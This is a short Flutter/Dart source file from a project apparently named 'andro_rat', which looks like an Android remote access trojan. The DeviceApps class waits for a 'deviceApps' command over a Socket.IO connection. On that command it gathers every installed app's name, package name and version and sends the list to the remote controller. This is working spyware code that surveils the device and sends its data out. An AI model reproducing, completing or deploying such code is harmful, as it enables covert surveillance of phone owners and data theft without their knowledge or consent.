import 'package:flutter_workspace/andro_rat/debug.dart';
import 'package:installed_apps/installed_apps.dart';
import 'package:socket_io_client/socket_io_client.dart' as SocketIO;

class DeviceApps {
  static const String remoteTrigger = "deviceApps";
  late SocketIO.Socket _socket;

  Future<Map> getPayload() async {
    final payload = <String, dynamic> {};
    var apps = await InstalledApps.getInstalledApps();
    var list = [];
    for (var app in apps) {
      list.add({
        "name": app.name,
        // "icon": app.icon,
        "packageName": app.packageName,
        "versionCode": app.versionCode,
        "versionName": app.versionName,
      });
    }
    payload.addAll({ "apps": list });
    return payload;
  }

  void registerEvents(SocketIO.Socket socket) {
    _socket = socket;

    _socket.on(remoteTrigger, (_) async {
      await sendPayload();
    });
  }

  void _sendPayload(String remoteTrigger, payload) {
    _socket.emit(remoteTrigger, payload);
  }

  Future<void> sendPayload() async {
    Debug.log("[Sending Installed Apps]:");
    _sendPayload(remoteTrigger, await getPayload());
    Debug.log(":[End Sending Installed Apps]");
  }

}
